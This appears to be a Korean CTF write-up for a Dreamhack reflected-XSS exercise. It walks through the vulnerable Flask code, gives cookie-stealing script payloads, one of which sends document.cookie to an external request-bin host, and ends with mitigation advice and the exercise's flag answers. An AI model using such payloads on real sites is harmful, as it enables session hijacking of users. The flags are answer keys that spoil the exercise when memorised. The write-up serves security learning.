---
title: Dreamhack Exercise XSS
date: 2022-02-15 16:17:52
tags: Dreamhack
categories: Dreamhack
---

## 문제 목표 및 기능 요약
XSS - 1 문제의 목표는 XSS 를 통해 임의 이용자의 쿠키를 탈취하는 것입니다

- / : 인덱스 페이지입니다
- /vuln : 이용자가 입력한 값을 출력합니다
- /memo : 이용자가 메모를 남길 수 있으며 작성한 메모를 출력합니다
- /flag : 전달된 URL 에 임의 이용자가 접속하게끔 합니다
해당 이용자의 쿠키에는 FLAG 가 존재합니다

## 웹 서비스 분석

### 엔드 포인트 : /vuln
Figure1 은 vuln 페이지를 구성하는 코드입니다
코드를 살펴보면 이용자가 전달한 xss 파라미터의 값을 출력합니다

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
```

### 엔드 포인트 : /memo
Figure2 는 memo 페이지를 구성하는 코드입니다
코드를 살펴보면 이용자가 전달한 memo 파라미터 값을 render_template 함수를 통해 기록하고 출력합니다

```python
@app.route('/memo') # memo 페이지 라우팅
def memo(): # memo 함수 선언
    global memo_text # 메모를 전역변수로 참조
    text = request.args.get('memo', '') # 사용가 전송한 memo 입력값을 가져옴
    memo_text += text + '\n' # 사용가 전송한 memo 입력값을 memo_text에 추가
    return render_template('memo.html', memo=memo_text) # 사이트에 기록된 memo_text를 화면에 출력
```

### 엔드 포인트 : /flag
Figure3 은 flag 페이지를 구성하는 코드입니다
코드를 살펴보면 메소드에 따른 요청마다 다른 기능을 수행하는 것을 알 수 있습니다

- GET : 이용자에게 URL 을 입력받는 페이지를 제공합니다
- POST : params 파라미터에 값과 쿠키에 FLAG 를 포함해 check_xss 함수를 호출합니다 check_xss 는 read_url 함수를 호출해 vuln 엔드 포인트에 접속합니다

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True
    
def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
    
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'
```

## 취약점 분석
vuln 과 memo 엔드 포인트는 이용자의 입력값을 페이지에 출력합니다
memo 는 reder_template 함수를 사용해 memo.html 을 출력합니다

render_template 함수는 전달된 템플릿 변수를 기록할 때 HTML 엔티티코드로 변환해 저장하기 때문에 XSS 가 발생하지 않습니다

그러나 vuln 은 이용자가 입력한 값을 페이지에 그대로 출력하기 때문에 XSS 가 발생합니다

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
```

## 익스플로잇
문제를 해결하기 위해서는 /vuln 엔드 포인트에서 발생하는 취약점을 통해 임의 이용자의 쿠키를 탈취해야 합니다

탈취한 쿠키를 전달받기 위해서는 외부에서 접근 가능한 서버를 사용하거나 문제에서 제공하는 memo 엔드 포인트를 사용할 수 있습니다

- location.href : 전체 URL 을 반환하거나 URL 을 업데이트할 수 있는 속성값입니다
- document.cookie : 해당 페이지에서 사용하는 쿠키를 읽고 쓰는 속성값입니다

## 쿠키 탈취
임의 사용자의 쿠키를 탈취하기 위한 방법은 다음과 같이 두가지가 있습니다

### memo 페이지 사용
flag 엔드 포인트에서 다음과 같은 익스플로잇 코드를 입력하면 memo 엔드 포인트에서 임의 이용자의 쿠키 정보를 확인할 수 있습니다

```javascript
<script>location.href = "/memo?memo=" + document.cookie;</script>
```

### 웹 서버 사용
외부에서 접근 가능한 서버를 통해 탈취한 쿠키를 확인할 수 있습니다

외부에서 접근 가능한 서버가 없다면 아래 첨부한 드림핵에서 제공하는 서비스를 사용할 수 있습니다

해당 서비스에서 제공하는 Request Bin 기능은 이용자의 접속 기록을 저장하기 때문에 해당 정보를 확인할 수 있습니다

Request Bin 버튼을 클릭하면 랜덤한 URL 이 생성되며 해당 URL 에 접속한 기록을 저장합니다

flag 기능에서 다음과 같은 익스플로잇 코드를 입력하면 Figure4 와 같이 접속 기록에 포함된 FLAG 를 확인할 수 있습니다

```javascript
<script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo=" + document.cookie;</script>
```

이러한 문제점은 악성 태그를 필터링하는 HTML Sanitization 을 사용하거나 엔티티코드로 치환하는 방법을 통해 해결할 수 있습니다

## XSS - 1
> DH{2c01577e9542ec24d68ba0ffb846508e}

## XSS - 2
> DH{3c01577e9542ec24d68ba0ffb846508f}

* * *

## Reference
Reference : https://dreamhack.io